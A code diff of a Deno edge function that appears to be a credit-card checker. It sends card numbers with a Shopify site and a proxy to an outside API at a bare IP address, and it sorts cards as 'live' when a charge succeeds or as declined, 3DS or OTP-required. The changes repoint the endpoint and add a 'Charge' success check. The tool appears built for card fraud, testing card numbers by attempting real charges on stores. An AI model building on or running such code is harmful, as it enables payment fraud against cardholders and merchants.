@@ -12,11 +12,11 @@ const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
 const SHOPIFY_DEBUG_CHAT_ID = "-1003848532661";
 
-const API_URL = "https://lavda-lasan.up.railway.app/shopify";
+const API_URL = "http://108.165.12.183:8081/";
 const buildApiUrl = (cc: string, site: string, proxy: string) =>
   proxy
-    ? `${API_URL}?cc=${encodeURIComponent(cc)}&site=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`
-    : `${API_URL}?cc=${encodeURIComponent(cc)}&site=${encodeURIComponent(site)}`;
+    ? `${API_URL}?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`
+    : `${API_URL}?cc=${encodeURIComponent(cc)}&url=${encodeURIComponent(site)}`;
 
 const badResponses = [
   "Site not supported",
@@ -269,7 +269,7 @@ const callApiOnce = async (cc: string, site: string, proxy: string): Promise<Api
       const responseText = (apiResponse || apiMessage || '').trim();
       if (isEmptyOrErrorOnly(responseText) && price === 0) {
         apiStatus = 'unknown';
-      } else if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true || json.status === 'ORDER_COMPLETED' || json.Response === 'ORDER_COMPLETED' || json.Response === 'Order completed 💎') {
+      } else if (String(json.Charge).toLowerCase() === 'true' || json.Charge === true || json.status === 'CHARGED' || json.status === 'success' || json.full_response === true || json.status === 'ORDER_COMPLETED' || json.Response === 'ORDER_COMPLETED' || json.Response === 'Order completed 💎') {
         apiStatus = 'live';
         apiMessage = json.Response || json.message || 'Charged';
       } else if (json.status === 'DECLINED' || json.status === 'failed' || json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED' || json.status === 'OTP_REQUIRED' || json.Response === 'OTP_REQUIRED') {
